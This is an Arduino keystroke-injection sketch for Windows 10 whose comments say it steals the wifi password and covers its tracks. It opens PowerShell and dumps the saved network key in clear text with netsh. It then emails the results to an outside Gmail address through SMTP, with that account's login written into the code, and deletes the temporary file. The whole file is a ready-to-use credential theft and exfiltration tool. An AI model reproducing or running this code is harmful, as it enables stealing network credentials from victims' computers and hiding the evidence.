//Author: Usama Sadiq
//Target: Windows 10
//Description: Steal the wifi password, sends the output to a Temp.txt file.
//Attaches the Temp.txt file, sends the email and deletes the file to cover our tracks.

#include<Keyboard.h>

void setup() {
  // initialize control over the keyboard:
    Keyboard.begin();
    delay(2000);
    
    Keyboard.press( KEY_LEFT_GUI);
    Keyboard.press('d');
    Keyboard.releaseAll();

    delay(2000);
    
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(2000);
    Keyboard.releaseAll();

    Keyboard.print("powershell");
    delay(2000);

    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    delay(100);

    Keyboard.print("$n = netsh wlan show interface | findstr '^....SSID'");
    delay(100);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(100);

    Keyboard.print("$n>>Temp.txt");
    delay(100);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(100);

    Keyboard.print("$SSID = $n.Split(':').Trim() | findstr -v '^SSID'");
    delay(100);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(100);

    Keyboard.print("$Key = netsh wlan show profiles name=$SSID Key=clear | findstr 'Key Content'>>Temp.txt");
    delay(100);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(100);

    Keyboard.print("$Auth = netsh wlan show profiles name=$SSID Key=clear | findstr 'Authentication'>>Temp.txt");
    delay(100);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(100);

    Keyboard.print("$Cipher = netsh wlan show profiles name=$SSID Key=clear | findstr 'Cipher'>>Temp.txt");
    delay(100);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(100);

    Keyboard.print("$SMTPServer = 'smtp.gmail.com'; $SMTPI = New-Object Net.Mail.SmtpClient($SMTPServer,587); $SMTPI.EnableSsl = $true; $SMTPI.Credentials = New-Object System.Net.NetworkCredential('j6848730@gmail.com','That#s70#sshow');$ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'j6848730@gmail.com'; $ReportEmail.To.Add('j6848730@gmail.com'); $ReportEmail.Subject = 'Wifi'; $ReportEmail.Body = 'The log is attached!'; $ReportEmail.Attachments.Add('Temp.txt'); $SMTPI.Send($ReportEmail);");
    delay(1000);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(2000);

    Keyboard.print("exit");
    delay(100);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(100);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(2000);
    Keyboard.releaseAll();

    Keyboard.print("powershell");
    delay(2000);

    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    delay(100);

    Keyboard.print("del Temp.txt");
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    delay(100);

    Keyboard.print("exit");
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    delay(100);
    
}

void loop() {
  // put your main code here, to run repeatedly:
  }
